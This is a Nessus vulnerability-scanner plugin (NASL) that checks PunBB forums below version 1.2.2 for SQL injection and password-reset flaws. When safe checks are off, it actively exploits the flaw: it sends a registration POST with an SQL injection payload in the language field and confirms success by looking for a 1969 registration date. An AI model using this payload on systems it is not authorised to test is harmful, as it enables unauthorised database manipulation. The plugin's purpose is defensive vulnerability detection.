#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(17224);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2005-0569", "CVE-2005-0570", "CVE-2005-0571");
  script_bugtraq_id(12652);
  script_osvdb_id(14128, 14129, 14130, 14131, 14132);

  script_name(english:"PunBB < 1.2.2 Multiple Input Validation Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of PunBB that fails to properly
sanitize user-input to several scripts thereby enabling an attacker to
launch various SQL injection attacks.  

In addition, the profile.php script enables anyone to call the
change_pass action while specifying the id of an existing user to set
their password to NULL, effectively shutting them out of the system." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=110927754230666&w=2" );
 script_set_attribute(attribute:"see_also", value:"http://forums.punbb.org/viewtopic.php?id=6460" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PunBB 1.2.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/02/24");
 script_cvs_date("$Date: 2011/03/14 21:48:11 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
  summary["english"] = "Detects input validation vulnerabilities in PunBB";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_family(english:"CGI abuses");

  script_dependencie("punBB_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/punBB");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # If safe_checks are enabled, rely on the version number alone.
  if (safe_checks()) {
    if (
      # Either the version is 1.1.x - 1.2.1 or
      ereg(pattern:"^1\.(1|2$|2\.1([^0-9]|$))", string:ver) ||
      # the version is unknown and report paranoia is Paranoid.
      ("unknown" >< ver && report_paranoia == 2)
    ) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
  # Otherwise, try to exploit it.
  else {
    # Specify a user / password to register. gettimeofday() serves
    # to avoid conflicts and have a (somewhat) random password.
    now = split(gettimeofday(), sep:".", keep:0);
    user = string("nessus", now[0]);
    pass = now[1];

    # Try to create a new user.
    url = "/register.php?action=register";
    bound = "bound";
    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="form_sent"', "\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_username"', "\r\n",
      "\r\n",
      user, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_password1"', "\r\n",
      "\r\n",
      "whatever\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_password2"', "\r\n",
      "\r\n",
      "whatever\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_email1"', "\r\n",
      "\r\n",
      user, "@example.com\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="language"', "\r\n",
      "\r\n",
      # nb: we're supplying values for language, style, registered, 
      #     registration_ip, and last_visit. A value of 0 for
      #     'registered' implies the user registered in 12/31/1969,
      #     which is the basis for our check below.
      "English','Oxygen',0,'0.0.0.0',0) -- \r\n",

      boundary, "--", "\r\n"
    );

    r = http_send_recv3(method: "POST",  item: dir + url, port: port,
      content_type: "multipart/form-data; boundary="+bound );
    if (isnull(r)) exit(0, "The web server did not answer");
    res = r[2];

    # Now check the User List for the user we just created.
    r = http_send_recv3(method:"GET", port:port,
      item:string(dir, "/userlist.php?username=", user, "&show_group=-1&sort_by=username&sort_dir=ASC&search=Submit") );
    if (isnull(r)) exit(0);
    res = r[2];

    # If they registered in 1969, there's a problem.
    if (egrep(pattern:'class="tcr">.*1969.*</td>', string:res)) {
      rep  = string(
        "**** Nessus has successfully exploited this vulnerability by registering\n",
        "**** the user ", user, " to PunBB on the remote host;\n",
        "**** you may wish to remove it at your convenience.\n"
      );
      security_hole(port:port, extra: rep);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
